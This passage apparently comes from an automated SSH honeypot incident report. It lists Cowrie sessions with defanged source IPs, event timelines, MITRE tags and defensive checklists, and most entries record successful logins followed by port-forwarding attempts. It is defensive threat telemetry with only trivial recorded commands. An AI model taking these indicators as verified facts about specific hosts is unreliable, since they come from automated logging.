- [ ] Block `131.100.242[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d625a1673f

| Field | Detail |
|---|---|
| **Source IP** | `131.100.242[.]102` |
| **First Seen** | 2026-08-20 05:51 |
| **Last Seen** | 2026-08-20 05:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:51:39` | `cowrie.session.connect` |
| `2026-08-20 05:51:39` | `cowrie.client.version` |
| `2026-08-20 05:51:39` | `cowrie.client.kex` |
| `2026-08-20 05:51:40` | `cowrie.login.success` |
| `2026-08-20 05:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.100.242[.]102` to AbuseIPDB if not already reported
- [ ] Block `131.100.242[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa090f068fb

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-20 05:57 |
| **Last Seen** | 2026-08-20 05:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:57:00` | `cowrie.session.connect` |
| `2026-08-20 05:57:01` | `cowrie.client.version` |
| `2026-08-20 05:57:01` | `cowrie.client.kex` |
| `2026-08-20 05:57:07` | `cowrie.login.success` |
| `2026-08-20 05:57:11` | `cowrie.session.params` |
| `2026-08-20 05:57:11` | `cowrie.command.input` |
| `2026-08-20 05:57:13` | `cowrie.log.closed` |
| `2026-08-20 05:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a85571dc266

| Field | Detail |
|---|---|
| **Source IP** | `220.180.171[.]157` |
| **First Seen** | 2026-08-20 05:57 |
| **Last Seen** | 2026-08-20 05:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:57:33` | `cowrie.session.connect` |
| `2026-08-20 05:57:34` | `cowrie.client.version` |
| `2026-08-20 05:57:34` | `cowrie.client.kex` |
| `2026-08-20 05:57:37` | `cowrie.login.success` |
| `2026-08-20 05:57:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.171[.]157` to AbuseIPDB if not already reported
- [ ] Block `220.180.171[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c534cb4213e

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-20 05:57 |
| **Last Seen** | 2026-08-20 05:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:57:46` | `cowrie.session.connect` |
| `2026-08-20 05:57:47` | `cowrie.client.version` |
| `2026-08-20 05:57:47` | `cowrie.client.kex` |
| `2026-08-20 05:57:50` | `cowrie.login.success` |
| `2026-08-20 05:57:50` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f616760269

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-08-20 05:57 |
| **Last Seen** | 2026-08-20 05:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:57:56` | `cowrie.session.connect` |
| `2026-08-20 05:57:56` | `cowrie.client.version` |
| `2026-08-20 05:57:56` | `cowrie.client.kex` |
| `2026-08-20 05:57:58` | `cowrie.login.success` |
| `2026-08-20 05:57:59` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa0265df5943

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]16` |
| **First Seen** | 2026-08-20 05:58 |
| **Last Seen** | 2026-08-20 05:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:58:51` | `cowrie.session.connect` |
| `2026-08-20 05:58:52` | `cowrie.client.version` |
| `2026-08-20 05:58:52` | `cowrie.client.kex` |
| `2026-08-20 05:58:54` | `cowrie.login.success` |
| `2026-08-20 05:58:55` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]16` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b887459e8b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]61` |
| **First Seen** | 2026-08-20 05:59 |
| **Last Seen** | 2026-08-20 05:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:59:00` | `cowrie.session.connect` |
| `2026-08-20 05:59:00` | `cowrie.client.version` |
| `2026-08-20 05:59:00` | `cowrie.client.kex` |
| `2026-08-20 05:59:01` | `cowrie.login.success` |
| `2026-08-20 05:59:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]61` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ccc3fadccda

| Field | Detail |
|---|---|
| **Source IP** | `213.234.9[.]218` |
| **First Seen** | 2026-08-20 06:14 |
| **Last Seen** | 2026-08-20 06:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:14:51` | `cowrie.session.connect` |
| `2026-08-20 06:14:52` | `cowrie.client.version` |
| `2026-08-20 06:14:52` | `cowrie.client.kex` |
| `2026-08-20 06:14:53` | `cowrie.login.success` |
| `2026-08-20 06:14:54` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.234.9[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.234.9[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107b1d12448e

| Field | Detail |
|---|---|
| **Source IP** | `80.233.77[.]136` |
| **First Seen** | 2026-08-20 06:14 |
| **Last Seen** | 2026-08-20 06:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:14:59` | `cowrie.session.connect` |
| `2026-08-20 06:15:00` | `cowrie.client.version` |
| `2026-08-20 06:15:00` | `cowrie.client.kex` |
| `2026-08-20 06:15:01` | `cowrie.login.success` |
| `2026-08-20 06:15:01` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.77[.]136` to AbuseIPDB if not already reported
- [ ] Block `80.233.77[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57c0e0234d7a

| Field | Detail |
|---|---|
| **Source IP** | `34.62.216[.]83` |
| **First Seen** | 2026-08-20 06:15 |
| **Last Seen** | 2026-08-20 06:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:15:42` | `cowrie.session.connect` |
| `2026-08-20 06:15:42` | `cowrie.login.success` |
| `2026-08-20 06:15:43` | `cowrie.session.params` |
| `2026-08-20 06:15:43` | `cowrie.command.input` |
| `2026-08-20 06:15:43` | `cowrie.command.input` |
| `2026-08-20 06:15:43` | `cowrie.command.failed` |
| `2026-08-20 06:15:43` | `cowrie.command.input` |
| `2026-08-20 06:15:43` | `cowrie.log.closed` |
| `2026-08-20 06:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.216[.]83` to AbuseIPDB if not already reported
- [ ] Block `34.62.216[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf4ef30e026

| Field | Detail |
|---|---|
| **Source IP** | `34.62.216[.]83` |
| **First Seen** | 2026-08-20 06:15 |
| **Last Seen** | 2026-08-20 06:16 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:15:51` | `cowrie.session.connect` |
| `2026-08-20 06:15:51` | `cowrie.login.success` |
| `2026-08-20 06:15:52` | `cowrie.session.params` |
| `2026-08-20 06:15:52` | `cowrie.command.input` |
| `2026-08-20 06:15:52` | `cowrie.command.failed` |
| `2026-08-20 06:16:05` | `cowrie.log.closed` |
| `2026-08-20 06:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.216[.]83` to AbuseIPDB if not already reported
- [ ] Block `34.62.216[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb0831e24bc2

| Field | Detail |
|---|---|
| **Source IP** | `34.62.216[.]83` |
| **First Seen** | 2026-08-20 06:15 |
| **Last Seen** | 2026-08-20 06:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:15:53` | `cowrie.session.connect` |
| `2026-08-20 06:15:53` | `cowrie.login.success` |
| `2026-08-20 06:15:54` | `cowrie.session.params` |
| `2026-08-20 06:15:54` | `cowrie.command.input` |
| `2026-08-20 06:16:05` | `cowrie.log.closed` |
| `2026-08-20 06:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.216[.]83` to AbuseIPDB if not already reported
- [ ] Block `34.62.216[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1937268f70a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 06:22 |
| **Last Seen** | 2026-08-20 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:22:01` | `cowrie.session.connect` |
| `2026-08-20 06:22:01` | `cowrie.client.version` |
| `2026-08-20 06:22:01` | `cowrie.client.kex` |
| `2026-08-20 06:22:01` | `cowrie.login.success` |
| `2026-08-20 06:22:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:22:02` | `cowrie.direct-tcpip.data` |
| `2026-08-20 06:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74d0ca86b09e

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-08-20 06:22 |
| **Last Seen** | 2026-08-20 06:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:22:18` | `cowrie.session.connect` |
| `2026-08-20 06:22:19` | `cowrie.client.version` |
| `2026-08-20 06:22:19` | `cowrie.client.kex` |
| `2026-08-20 06:22:21` | `cowrie.login.success` |
| `2026-08-20 06:22:22` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d70139c86778

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-20 06:22 |
| **Last Seen** | 2026-08-20 06:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:22:27` | `cowrie.session.connect` |
| `2026-08-20 06:22:28` | `cowrie.client.version` |
| `2026-08-20 06:22:28` | `cowrie.client.kex` |
| `2026-08-20 06:22:30` | `cowrie.login.success` |
| `2026-08-20 06:22:30` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96df86140090

| Field | Detail |
|---|---|
| **Source IP** | `223.241.214[.]127` |
| **First Seen** | 2026-08-20 06:27 |
| **Last Seen** | 2026-08-20 06:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:27:17` | `cowrie.session.connect` |
| `2026-08-20 06:27:18` | `cowrie.client.version` |
| `2026-08-20 06:27:18` | `cowrie.client.kex` |
| `2026-08-20 06:27:20` | `cowrie.login.success` |
| `2026-08-20 06:27:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.241.214[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.241.214[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936d4af6a39d

| Field | Detail |
|---|---|
| **Source IP** | `88.84.209[.]146` |
| **First Seen** | 2026-08-20 06:27 |
| **Last Seen** | 2026-08-20 06:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:27:27` | `cowrie.session.connect` |
| `2026-08-20 06:27:27` | `cowrie.client.version` |
| `2026-08-20 06:27:27` | `cowrie.client.kex` |
| `2026-08-20 06:27:28` | `cowrie.login.success` |
| `2026-08-20 06:27:29` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.84.209[.]146` to AbuseIPDB if not already reported
- [ ] Block `88.84.209[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65f34cb89cc

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-08-20 06:30 |
| **Last Seen** | 2026-08-20 06:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:30:45` | `cowrie.session.connect` |
| `2026-08-20 06:30:46` | `cowrie.client.version` |
| `2026-08-20 06:30:46` | `cowrie.client.kex` |
| `2026-08-20 06:30:48` | `cowrie.login.success` |
| `2026-08-20 06:30:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a71f939a3ba

| Field | Detail |
|---|---|
| **Source IP** | `120.234.195[.]41` |
| **First Seen** | 2026-08-20 06:30 |
| **Last Seen** | 2026-08-20 06:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:30:54` | `cowrie.session.connect` |
| `2026-08-20 06:30:54` | `cowrie.client.version` |
| `2026-08-20 06:30:54` | `cowrie.client.kex` |
| `2026-08-20 06:30:57` | `cowrie.login.success` |
| `2026-08-20 06:30:57` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.195[.]41` to AbuseIPDB if not already reported
- [ ] Block `120.234.195[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cbd7e6b059a

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-20 06:30 |
| **Last Seen** | 2026-08-20 06:36 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:30:56` | `cowrie.session.connect` |
| `2026-08-20 06:30:56` | `cowrie.client.version` |
| `2026-08-20 06:30:56` | `cowrie.client.kex` |
| `2026-08-20 06:31:00` | `cowrie.login.success` |
| `2026-08-20 06:31:01` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539c6a951f2a

| Field | Detail |
|---|---|
| **Source IP** | `118.123.116[.]93` |
| **First Seen** | 2026-08-20 06:31 |
| **Last Seen** | 2026-08-20 06:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:31:06` | `cowrie.session.connect` |
| `2026-08-20 06:31:08` | `cowrie.client.version` |
| `2026-08-20 06:31:08` | `cowrie.client.kex` |
| `2026-08-20 06:31:11` | `cowrie.login.success` |
| `2026-08-20 06:31:13` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.123.116[.]93` to AbuseIPDB if not already reported
- [ ] Block `118.123.116[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1000ca70e75d

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-08-20 06:32 |
| **Last Seen** | 2026-08-20 06:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:32:19` | `cowrie.session.connect` |
| `2026-08-20 06:32:20` | `cowrie.client.version` |
| `2026-08-20 06:32:20` | `cowrie.client.kex` |
| `2026-08-20 06:32:22` | `cowrie.login.success` |
| `2026-08-20 06:32:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92bcd2e4878

| Field | Detail |
|---|---|
| **Source IP** | `123.123.196[.]140` |
| **First Seen** | 2026-08-20 06:32 |
| **Last Seen** | 2026-08-20 06:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:32:29` | `cowrie.session.connect` |
| `2026-08-20 06:32:29` | `cowrie.client.version` |
| `2026-08-20 06:32:29` | `cowrie.client.kex` |
| `2026-08-20 06:32:32` | `cowrie.login.success` |
| `2026-08-20 06:32:32` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.123.196[.]140` to AbuseIPDB if not already reported
- [ ] Block `123.123.196[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5782692a8f4

| Field | Detail |
|---|---|
| **Source IP** | `45.79.115[.]59` |
| **First Seen** | 2026-08-20 06:37 |
| **Last Seen** | 2026-08-20 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:37:39` | `cowrie.session.connect` |
| `2026-08-20 06:37:39` | `cowrie.login.success` |
| `2026-08-20 06:37:40` | `cowrie.session.params` |
| `2026-08-20 06:37:41` | `cowrie.log.closed` |
| `2026-08-20 06:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.115[.]59` to AbuseIPDB if not already reported
- [ ] Block `45.79.115[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3901e1ef3fde

| Field | Detail |
|---|---|
| **Source IP** | `36.64.33[.]82` |
| **First Seen** | 2026-08-20 06:48 |
| **Last Seen** | 2026-08-20 06:48 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:48:01` | `cowrie.session.connect` |
| `2026-08-20 06:48:02` | `cowrie.client.version` |
| `2026-08-20 06:48:02` | `cowrie.client.kex` |
| `2026-08-20 06:48:07` | `cowrie.login.success` |
| `2026-08-20 06:48:09` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.33[.]82` to AbuseIPDB if not already reported
- [ ] Block `36.64.33[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a981200f06a5

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-20 06:48 |
| **Last Seen** | 2026-08-20 06:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:48:15` | `cowrie.session.connect` |
| `2026-08-20 06:48:15` | `cowrie.client.version` |
| `2026-08-20 06:48:15` | `cowrie.client.kex` |
| `2026-08-20 06:48:17` | `cowrie.login.success` |
| `2026-08-20 06:48:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
